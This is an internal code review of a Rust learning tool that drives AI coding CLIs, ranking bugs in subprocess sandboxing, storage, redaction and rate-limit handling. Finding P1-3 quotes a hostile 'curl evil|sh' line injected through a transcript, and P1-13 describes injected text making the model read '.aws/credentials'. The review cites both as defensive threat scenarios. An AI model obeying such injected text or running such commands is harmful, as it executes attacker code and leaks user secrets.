# T60 independent code review

Read-only review of the whole workspace at `staging` (T10-T54 merged). Scope: correctness, unbounded memory/channels,
secret leakage, subprocess safety, store crash safety, FSRS parity, non-test panics, plan-vs-code gaps.
Paths are relative to `crates/`. Severity: **P0** the shipped product cannot do its core job, **P1** data loss,
secret exposure, hang or silent wrong result in normal use, **P2** robustness/hardening.

Verified OK (no finding):
- **FSRS parity.** `lp-core/src/fsrs.rs` replayed 3000 random review sequences (gaps 0s to 400d, all ratings) against
  `tracker/server/digest/fsrs.ts` (ts-fsrs 5.4.2): 0 mismatches on due, stability, difficulty, reps, lapses, state.
  Only `preview` was not diffed.
- **Subprocess basics.** `kill_on_drop(true)`, `env_clear` + `HOME`/`PATH` only (strips `CLAUDECODE`, API keys), private random
  `0700` tempdir sandbox, cancel/timeout select that kills the child, bounded `mpsc` everywhere, `unbounded_channel` banned.
- **Panics.** Non-test `expect`/`unwrap` are only provable invariants (`subprocess.rs:86,92,98` piped handles, `plan.rs:382`
  8-byte slice, static regexes). No `unsafe`. No token/secret is logged (`tracing` has one call site and no subscriber).
- **Ingest redaction** is applied to transcripts, AGY artifacts and git subject/body/diff *before* clipping/capping.

---

## P0

### P0-1 Custom tools (`probe`, `quiz`, `plan_init`, `submit`, ...) cannot reach a real CLI
`lp-cli-driver/src/engine/subprocess.rs:109-131,206-247`, `lp-agent/src/loops/mod.rs:322-362`, `lp-agent/src/workbench/agent.rs:77-80`.
`TurnRequest` is `{prompt, model}` only. Tools exist solely as `usage:` text in the prompt (`render_prompt`), and `deltas()`
yields a `ToolCall` only from Claude's *native* `tool_use` blocks; Codex/Agy never yield one. `claude -p --strict-mcp-config`
has no `probe`/`quiz` registered, so the model either answers in prose or calls built-in tools (`Bash`, `Read`) that
`Session::exec` rejects as unknown. Everything passes with `FauxEngine`, which scripts `faux_tool_call` directly.
**Failure scenario:** `learnpuppy chat new "raft"` on a real machine: no question is ever posed, `calls.is_empty()` ends the turn
after prose, the Probe->Plan->Teach lifecycle never starts; the extractor/sub-agent `submit` tool has the same hole.
**Fix:** define a text/JSON tool protocol (or a tiny stdio MCP server passed via `--mcp-config`) and parse it in `deltas()`; add one PTY test against a mock CLI that emits that protocol.

## P1

### P1-1 Default Claude account is launched with `CLAUDE_CONFIG_DIR=~/.claude`
`lp-cli-driver/src/engine/subprocess.rs:77-79`, `lp-cli-driver/src/accounts/discover.rs:37-38,64-71`.
`~/.claude` is discovered first with `config_dir = Some(~/.claude)`, whose login lives in the *sibling* `~/.claude.json` (and, on macOS, a
Keychain item keyed to the default location). Exporting the var changes where Claude Code looks for its config and credentials (to be confirmed on a real install).
**Failure scenario:** the primary account runs as "not logged in", is classified `AuthExpired`, and traffic silently fails over to account 2.
**Fix:** leave `CLAUDE_CONFIG_DIR` unset when `config_dir == $HOME/.claude`.

### P1-2 Cancellation is never wired; quitting mid-turn hangs
`lp-tui/src/backend.rs:119,162,193`, `lp-tui/src/app.rs:305-309`.
Turns and folds run via `spawn_blocking(block_on(..))` with a fresh `CancellationToken::new()` nobody cancels. Esc does nothing, and returning from `main`
drops the runtime, which waits for blocking tasks, i.e. for the child to finish (up to `timeout` = 600 s).
**Failure scenario:** press `q` during a streaming turn: terminal restores but the process lingers for up to 10 minutes with the CLI still running.
**Fix:** keep one app-level token in `Backend`, cancel it on quit/Esc, and spawn async tasks instead of `spawn_blocking(block_on)`.

### P1-3 CLI children inherit the user's own permissive config and are fed untrusted text
`lp-cli-driver/src/engine/subprocess.rs:113-128`.
Prompts embed ingested transcripts, git diffs and imported notes. `claude -p` still loads the user's `settings.json`/hooks (via `HOME`/config dir) with all built-in tools enabled; `codex exec` has no explicit `-s read-only`; both inherit any `bypassPermissions`/`danger-full-access` default.
**Failure scenario:** a transcript line "run `curl evil|sh`" plus a user setting that allows `Bash` makes the "structured completion" run a shell with the user's rights.
**Fix:** pass `--tools ""` (and no hooks/slash commands) to claude, `-s read-only` to codex.

### P1-4 Stderr is drained only up to 64 KiB, then the child can block on a full pipe
`lp-cli-driver/src/engine/subprocess.rs:93-97` (`take(STDERR_CAP)`), `:186-188`.
After the cap the reader task ends and stops reading; a verbose CLI blocks on `write(2)` and stdout stalls until the 600 s timeout. Separately, after stdout EOF `child.wait()` has no timeout/cancel.
**Fix:** read to EOF but keep only the first/last 64 KiB; wrap the final `wait()` in the same cancel/deadline select.

### P1-5 Rate-limit handling can panic, and false positives disable an account for good
`lp-cli-driver/src/accounts/pool.rs:129-131,162-196`, `lp-tui/src/engine.rs:74-128`.
(a) `now + cooldown` is `Instant + Duration`, and `parse_cooldown` is uncapped: `...limit reached|99999999999999999` panics (overflow) and `n * 3600` can overflow `u64`.
(b) `classify` matches the substrings `login`, `401`, `429` anywhere in stderr (a path, port, or model text), then `report_auth_expired` sets `AuthExpired`, which nothing ever clears.
(c) Claude prints its usage-limit message on stdout with exit 1 (to verify), where `classify` only looks at stderr, so failover never fires.
**Failure scenario:** one stray "401" in an error permanently drops the account until restart; a hostile `|<huge>` message aborts the TUI.
**Fix:** `.min(MAX_COOLDOWN)` on parsed values with `checked_mul`; match word-bounded phrases and include stdout; give `AuthExpired` a retry-after-cooldown.

### P1-6 JSONL ledger: one corrupt middle line makes the next append delete everything after it
`lp-store/src/jsonl.rs:43-53,72-86`.
`valid_prefix` stops at the first bad line (any position); `append` then `set_len(valid)`, truncating all later *valid* records. `read_all` silently returns the prefix.
**Failure scenario:** a bit-flip or sync-tool merge marker on line 40 of `nodes.jsonl`; the next extraction truncates lines 41..N (graph and coverage data lost, no error).
**Fix:** truncate only a final unterminated/corrupt tail; for a bad interior line skip or quarantine it (`.corrupt` copy) and keep going.

### P1-7 Store writes are not safe across processes (TUI + CLI share `~/.learnpuppy`)
`lp-store/src/jsonl.rs:73-86,95`, `lp-store/src/chat.rs:11`, `lp-store/src/jobs.rs:10`.
Locks are in-process `Mutex`es. Two processes appending read the same `valid`, one `set_len`s away the other's line; `write_atomic` uses the fixed temp name `.<name>.tmp` (PLAN says `.tmp.<pid>`), so concurrent writers interleave bytes in one temp file before `rename`.
**Failure scenario:** `learnpuppy graph import` while the TUI folds a decision: a chain or coverage line vanishes, or a chat file is replaced by a mix of both writes.
**Fix:** per-store `flock` (std `File::lock`) around append/rewrite and put the pid in the temp name.

### P1-8 Proposition search index holds the *last link-append line*, not the merged node
`lp-store/src/graph.rs:29-31,56-59,35-48`.
`index()` deletes by id then inserts the raw appended `GraphNode`. A link-append (`merge_findings` writes `name`/`statement` of the paraphrase, `aliases=[name]`) therefore replaces the original name/statement/json in FTS; the same happens on every restart rebuild.
**Failure scenario:** after one equivalence link, the Auditor's `find` returns the second paraphrase as the canonical node, original wording is unsearchable, and equivalence bias drifts.
**Fix:** rebuild/index from `GraphSnapshot::from_ledgers` (merged nodes), not from raw lines.

### P1-9 `ingest` cursors are written even for sessions the `since`/allowlist filters skipped
`lp-ingest/src/scan.rs:72-80,101-107`, `lp-tui/src/cli/ingest.rs:57-62`.
`save` filters on `since_ms` and the repo allowlist, but `finish` records the `mtime+size` cursor regardless, and the unchanged file is skipped next run.
**Failure scenario:** `ingest --since 7d` then `ingest --since 30d` (or adding `--repo X` later) never picks up the older/new-repo sessions.
**Fix:** only set the cursor when every session in the file was stored, or key the cursor on `(since, allowlist hash)`.

### P1-10 `learnpuppy ingest` does not distill, mint cards, match commits, or seed
`lp-tui/src/cli/ingest.rs:35-68`, `lp-ingest/src/distill/seed.rs:9`, `lp-ingest/src/git.rs:33`.
It only upserts raw sessions. `distill_session`, `generate_*_cards`, `commits_for_session` and `seed_rust_sysdesign` have no caller outside tests, and `--seed-rust-sysdesign` does not exist (PLAN 5.2, T41). `$CLAUDE_CONFIG_DIR` is also not scanned (`scan.rs:15-26`).
**Failure scenario:** fresh install: `ingest` then `review` shows zero cards; the Digest view has no decisions. The headline "ingest -> distill -> FSRS card" flow is dead.
**Fix:** wire `distill_session` -> `generate_decision_cards` (+ `emit_to_graph`) into `ingest::run`, add the seed flag.

### P1-11 Workbench (sub-agents, wake pump, crash recovery) is dead code in the binary
`lp-agent/src/workbench/mod.rs`, `lp-tui/src/backend.rs`, `lp-tui/src/session.rs`.
Nothing in `lp-tui` constructs `Workbench` or calls `launch`/`pump`/`recover`; `Web` and `Pdf` have only test fakes (`workbench/tests.rs:23,38`), and `reqwest`/`scraper` are declared but unused (no `pdf-extract`, no `HttpApiEngine`/BYOK).
**Failure scenario:** `research`/`pdf`/`visual`/`demo` calls are accepted and queued in `s.requests` but never launched; "interrupted" jobs are never recovered.
**Fix:** wire `Workbench` into `Backend::drive` and add the real `Web`/`Pdf` adapters, or cut the tools from the prompts until then.

### P1-12 Multi-device FSRS sync is not functional
`lp-tui/src/review.rs:7,27-38`, `lp-store/src/tracker.rs:73`, `lp-core/src/fsrs.rs:255`.
`DEVICE` is the constant `"local"` (two machines both write `sync-local.jsonl`), `import_sync` is never called, and `fsrs::replay` is unused: card state is mutated incrementally and never recomputed from the merged review log (PLAN 4.4 event-sourced replay).
**Failure scenario:** reviews done on a laptop never change the desktop's schedule; a Syncthing copy of `sync-local.jsonl` conflicts.
**Fix:** per-install device id in settings, call `import_sync` at startup then `replay` affected cards from `reviews()`.

### P1-13 `read`/`grep`/`find`/`ls` agent tools expose secrets to the model unredacted
`lp-agent/src/loops/tools.rs:221-232,262-266,297-315`.
`resolve` only blocks escaping the root; hidden files (`.env`, `.git/config`, `.aws/credentials`) are readable by explicit path and the output goes straight to the provider with no `redact`. The root is the launch `cwd` (could be `~`).
**Failure scenario:** launched from `$HOME`, the model (or injected note text) calls `read(".aws/credentials")` and the keys are sent to the LLM.
**Fix:** refuse dot-path components and run tool output through the ingest `redact` (move it to `lp-core`).

### P1-14 Extractor sends everything uncovered in one prompt (no batching)
`lp-agent/src/extract/mod.rs:93-112,167-177`, `lp-cli-driver/src/engine/subprocess.rs:157`.
`import_notes` turns a whole book into one structured call (PLAN: per-batch). For agy the prompt is an `argv` item (`-p <prompt>`), so large imports fail with `E2BIG` (and the text is visible in `ps`); for claude/codex it exceeds context.
**Failure scenario:** `graph import book.md` (1 MB) fails or truncates after the user waits for the call.
**Fix:** batch by ~20k tokens (`tokens` is already computed) and send agy prompts over stdin.

### P1-15 Redaction gaps and clip-before-redact
`lp-ingest/src/redact.rs:9-31`, `lp-ingest/src/agy.rs:43,56,65`.
Not covered: bare JWTs (`eyJ...`), `Cookie:`/`Set-Cookie:`, `Authorization: Token ...`, `--password foo` style CLI args, values under names like `auth`/`pwd`/`dsn`, Bearer tokens under 8 chars. In `agy.rs` artifacts are `clip`ped to 1500 chars *before* `redact`, so a secret cut mid-token (or an unterminated PEM block) is no longer matchable, and `cwd`/`title` bypass it.
**Failure scenario:** a pasted `curl -H 'Cookie: session=...'` is stored in `tracker.db` and sent to the distiller.
**Fix:** add cookie/JWT/`--password` rules, redact before clipping, and redact AGY `cwd`/`title`.

## P2

### P2-1 `~/.learnpuppy` is created with the default umask
`lp-tui/src/state.rs:37-44`, `lp-store/src/jsonl.rs:96`, `lp-store/src/{chat,jobs,graph,tracker}.rs` (`create_dir_all`).
Chats, `tracker.db` (coding transcripts) and `settings.json` are 0644 in a 0755 tree; PLAN requires 0600 for `auth.json` (BYOK not implemented, see P1-11). **Fix:** create the root `0700` and files `0600` via `OpenOptionsExt::mode`.

### P2-2 `try_send` silently drops user commands
`lp-tui/src/app.rs:332-335`. A `Grade`/`Answer` is lost if the 32-slot queue is full (worker busy in a blocking SQLite scan). **Fix:** `send().await` for user commands; drop only `Refresh`.

### P2-3 Failover after partial output duplicates text
`lp-tui/src/engine.rs:69-90`. Deltas already sent to `event_tx` stay in the stream when the next account retries. **Fix:** only fail over if no delta was emitted, else surface the error. Also `report_success(&id, 0, 0)` (`:71`) means no token telemetry and no persisted `account_usage_ledger` (PLAN 2.2).

### P2-4 Git helpers
`lp-ingest/src/git.rs:21-29,49-71`. Add `--no-ext-diff --no-textconv` (a repo's `.git/config` can name a diff/textconv program); commits per session are unbounded (3 `git` spawns each); blocking `std::process::Command` can run on an async thread; `git` failure is swallowed as "no commits".

### P2-5 Invalid UTF-8 aborts a whole transcript
`lp-ingest/src/transcript.rs:87-99`. `read_line` errors on one bad byte, the file is reported and retried every run. **Fix:** `read_until` + `from_utf8_lossy`.

### P2-6 `--since` parsing can panic
`lp-tui/src/cli/ingest.rs:24-32`. `split_at(len-1)` panics inside a multibyte char (`--since 7天`); `n * hours * 3_600_000` overflows `i64` (debug panic). **Fix:** `strip_suffix` + `checked_mul`.

### P2-7 `grade` is three non-atomic writes and loads every card
`lp-tui/src/review.rs:21-39`. A crash between `upsert_card`, `append_review` and `append_sync` leaves the schedule and log disagreeing; `t.cards()` parses all cards per grade. **Fix:** one SQLite transaction, then the sync line; query by id.

### P2-8 One corrupt file breaks listing and recovery
`lp-store/src/chat.rs:56`, `lp-store/src/jobs.rs:33`. A single bad `chats/*.json`/`jobs/*.json` fails `list_chats`/`claim_steers`/`interrupted_jobs` entirely. **Fix:** skip and report unreadable files.

### P2-9 Claimed steer lost on crash
`lp-agent/src/workbench/mod.rs:165-168`, `lp-store/src/jobs.rs:66`. `claim_steers` marks `Claimed` on disk before the transcript holding the steer is saved. **Fix:** mark claimed after `Session::save`, or recover `Claimed` jobs whose `steer_<id>` is absent.

### P2-10 SQLite open order and new-file durability
`lp-store/src/db.rs:9-13` sets `busy_timeout` after `journal_mode=WAL` (second process gets an immediate `SQLITE_BUSY`); `jsonl.rs:76-85` does not fsync the directory after creating a new ledger file. **Fix:** busy timeout first; fsync the dir on create.

### P2-11 Ledger append is O(file) per record
`lp-store/src/jsonl.rs:75`. Every append reads and CRC-checks the whole ledger (`coverage.jsonl` grows per message), O(n^2) for imports. **Fix:** check only the tail from the known-good offset.

### P2-12 Distiller and extractor id stability
`lp-ingest/src/distill/mod.rs:79,115`: only the first 12 000 chars of a transcript are distilled (late decisions lost) and the decision id hashes the model's title (rerun creates duplicates). `lp-agent/src/extract/mod.rs:113-121`: after a crash between node writes and coverage, a retry can reuse `chat/batch:p1` ids for different text and merge it into the wrong node as an alias. **Fix:** window the transcript; hash `(session, files, commit)`; hash proposition text into the minted id.

### P2-13 Agent file tools read whole files; `readable` is quadratic
`lp-agent/src/loops/tools.rs:264,302` read entire files into memory before truncating (a multi-GB or FIFO file in the tree stalls/OOMs; `grep` also walks `target/`, `node_modules/`). `lp-agent/src/workbench/jobs.rs:55` lowercases the remaining HTML at every `<script`/`<style`. **Fix:** `take(MAX)` on a reader, skip non-regular files; search the lowered copy once.

### P2-14 UI hides store errors and rescans everything every 2 s
`lp-tui/src/backend.rs:210-211,346,389,397`, `app.rs:339-341`. `unwrap_or_default()` turns a corrupt DB into an empty "no cards" screen; each `Refresh` reloads decisions, all cards, all reviews and the graph on the worker. **Fix:** surface the error in `live.error`; refresh on change or per view.

### P2-15 Environment is stripped too far for real setups
`lp-cli-driver/src/engine/subprocess.rs:70-76`. `HTTPS_PROXY`, `SSL_CERT_FILE`, `TMPDIR`, `LANG` are dropped, so proxied/corporate machines fail; allow-list them. Add `Command::process_group(0)` so grandchildren die with the CLI on timeout (PLAN 3.1.5).

### P2-16 Plan items still absent
`tracing` file logging (`~/.learnpuppy/logs`) is not initialised; `HttpApiEngine` + `auth.json` (BYOK) unimplemented; Digest view hardcodes `project: "-"` and empty `source` (`backend.rs:401`); `lp-agent/src/lib.rs` keeps a placeholder `smoke_test`; T60 E2E/PTY (`expectrl`) suite and `ocr` run are not in the Makefile gate.
